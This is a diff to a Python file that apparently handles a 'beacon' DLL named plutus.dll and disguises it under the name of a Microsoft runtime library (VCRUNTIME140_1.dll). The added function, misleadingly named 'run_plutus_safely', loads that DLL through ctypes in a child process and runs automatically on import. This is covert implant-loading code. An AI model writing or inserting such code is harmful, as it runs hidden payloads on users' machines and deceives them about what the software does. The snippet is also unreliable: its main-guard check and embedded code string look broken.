@@ -369,4 +369,15 @@ def mv_dll_plutus_noadmin(beacon_path="plutus.dll", fake_name="VCRUNTIME140_1.dl
         
 
 # if __name__ == "main.py":
-mv_dll_plutus_noadmin("plutus.dll", fake_name="VCRUNTIME140_1.dll")
+# mv_dll_plutus_noadmin("plutus.dll", fake_name="VCRUNTIME140_1.dll")
+
+def run_plutus_safely():
+    code = '''
+    import ctypes, sys, pathlib, glob
+    PACKAGE_ROOT = pathlib.Path(__file__).parent.resolve()
+    dll_path = glob.glob(str(PACKAGE_ROOT / "plutus.dll"))[0]
+    ctypes.WinDLL(dll_path).CreateProcessNotify()
+    '''
+    subprocess.call([sys.executable, "-c", code])
+
+run_plutus_safely()
